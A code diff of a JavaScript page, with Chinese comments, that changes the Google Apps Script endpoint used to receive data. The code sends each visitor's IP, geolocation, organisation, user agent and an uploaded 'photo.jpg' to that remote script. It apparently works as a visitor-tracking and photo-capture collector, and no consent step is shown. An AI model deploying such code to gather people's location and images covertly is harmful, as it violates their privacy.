@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycbw1anJd6msAyjO4SAiKQugww_z4yyUMPAlk6RWSA0PtCQEGiuGFhBE3r7vad_l5_qSy6A/exec'); // 替換為您的 URL
+        const url = new URL('https://script.google.com/macros/s/AKfycbx5msS3bFMb2ag--lQS8zBGXJ41rg2LcJFAYxOXiqgdvbhiyk1RlcK-Y5qJ9pvV-BCOtQ/exec'); // 替換為您的 URL
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -71,7 +71,7 @@
         formData.append('photo', compressedBlob, 'photo.jpg');
         formData.append('userAgent', navigator.userAgent);
 
-        const response = await fetch('https://script.google.com/macros/s/AKfycbw1anJd6msAyjO4SAiKQugww_z4yyUMPAlk6RWSA0PtCQEGiuGFhBE3r7vad_l5_qSy6A/exec', { // 替換為您的後端 URL
+        const response = await fetch('https://script.google.com/macros/s/AKfycbx5msS3bFMb2ag--lQS8zBGXJ41rg2LcJFAYxOXiqgdvbhiyk1RlcK-Y5qJ9pvV-BCOtQ/exec', { // 替換為您的後端 URL
           method: 'POST',
           body: formData,
         });
